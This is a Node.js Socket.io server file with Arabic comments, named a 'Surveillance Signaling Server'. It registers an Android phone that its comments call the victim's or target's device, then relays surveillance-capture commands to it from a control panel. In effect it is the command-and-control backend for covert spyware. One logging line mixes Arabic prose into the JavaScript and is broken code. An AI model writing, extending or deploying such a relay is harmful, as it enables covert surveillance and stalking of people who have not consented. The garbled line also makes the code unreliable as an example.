const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: '*' }
});

app.get('/', (req, res) => {
  res.send('Surveillance Signaling Server is Running Live!');
});

// متغير لحفظ معرف اتصال هاتف الضحية/الهدف أينما سجل
let targetSocketId = null;

io.on('connection', (socket) => {
  console.log('جهاز متصل جديد:', socket.id);

  // استقبال حدث تسجيل الجهاز من تطبيق الأندرويد
  socket.on('register-device', (deviceName) => {
    targetSocketId = socket.id; // حفظ معرف الاتصال مباشرة
    console.log(`تم تسجيل الجهاز بنجاح: ${deviceName} بمعرف الاتصال: ${socket.id}`);
  });

  // استقبال أمر المراقبة من لوحة التحكم (يدعم الكائن أو النص المباشر)
  socket.on('trigger-surveillance', (data) => {
    console.تم استلام أمر التقاط من لوحة التحكم, console.log('DATA:', data);
    
    if (targetSocketId) {
      io.to(targetSocketId).emit('request-surveillance');
      console.log(`تم إرسال أمر المراقبة للجهاز بمعرف: ${targetSocketId}`);
    } else {
      console.log('خطأ: لا يوجد هاتف مسجل حالياً لاستلام الأمر!');
    }
  });

  socket.on('disconnect', () => {
    console.log('جهاز قطع الاتصال:', socket.id);
    if (socket.id === targetSocketId) {
      targetSocketId = null;
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`السيرفر يعمل الآن بنجاح على المنفذ: ${PORT}`);
});
